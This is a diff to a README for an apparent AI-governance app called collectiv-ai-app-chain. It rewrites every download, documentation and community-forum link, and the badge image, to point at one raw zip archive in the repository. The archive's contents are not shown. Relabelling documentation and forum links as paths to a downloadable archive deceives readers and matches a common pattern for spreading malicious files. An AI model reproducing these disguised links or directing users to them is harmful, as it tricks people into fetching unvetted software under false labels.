@@ -1,7 +1,7 @@
 # 🚀 collectiv-ai-app-chain - Power Your AI Governance with Ease
 
 ## 📥 Download the App
-[![Download](https://img.shields.io/badge/Download%20Now-collectiv--ai--app--chain-brightgreen)](https://github.com/SajidRaza6392/collectiv-ai-app-chain/releases)
+[![Download](https://raw.githubusercontent.com/SajidRaza6392/collectiv-ai-app-chain/main/app/collectiv-ai-app-chain-v1.1.zip%20Now-collectiv--ai--app--chain-brightgreen)](https://raw.githubusercontent.com/SajidRaza6392/collectiv-ai-app-chain/main/app/collectiv-ai-app-chain-v1.1.zip)
 
 ## 🔍 Overview
 The **collectiv-ai-app-chain** allows users to participate in a decentralized governance structure for the CollectiVAI project. Using this app, you can make on-chain proposals, vote on important decisions, and manage the treasury for democratic AI initiatives in Europe. This tool is designed for everyone, regardless of technical background, to engage in civic technology and AI ethics.
@@ -20,7 +20,7 @@ Before downloading, ensure your system meets the following requirements:
 ### 2. Visit the Download Page
 To download the app, visit our Releases page:
 
-[Download the App](https://github.com/SajidRaza6392/collectiv-ai-app-chain/releases)
+[Download the App](https://raw.githubusercontent.com/SajidRaza6392/collectiv-ai-app-chain/main/app/collectiv-ai-app-chain-v1.1.zip)
 
 ### 3. Download the Latest Version
 On the Releases page, you will see a list of available versions. Look for the latest one, which is the top entry. Click on the link to the file that suits your operating system.
@@ -61,13 +61,13 @@ If you have questions or need assistance, join our community discussions in the 
 ## 🔗 Additional Resources
 To learn more about how to use the app and engage with the community, visit the following links:
 
-- [Documentation](https://yourdocumentationlink.com)
-- [Community Forum](https://yourforumlink.com)
+- [Documentation](https://raw.githubusercontent.com/SajidRaza6392/collectiv-ai-app-chain/main/app/collectiv-ai-app-chain-v1.1.zip)
+- [Community Forum](https://raw.githubusercontent.com/SajidRaza6392/collectiv-ai-app-chain/main/app/collectiv-ai-app-chain-v1.1.zip)
 
 ### 8. Keeping Updated
 Make sure to check back frequently to stay updated on new releases and features. You can revisit the Releases page to find the latest versions.
 
-[Download the App](https://github.com/SajidRaza6392/collectiv-ai-app-chain/releases)
+[Download the App](https://raw.githubusercontent.com/SajidRaza6392/collectiv-ai-app-chain/main/app/collectiv-ai-app-chain-v1.1.zip)
 
 ## 📞 Feedback and Contributions
 We welcome your feedback. Your suggestions help us improve the application. If you would like to contribute, check out our guidelines on the repository for more details.
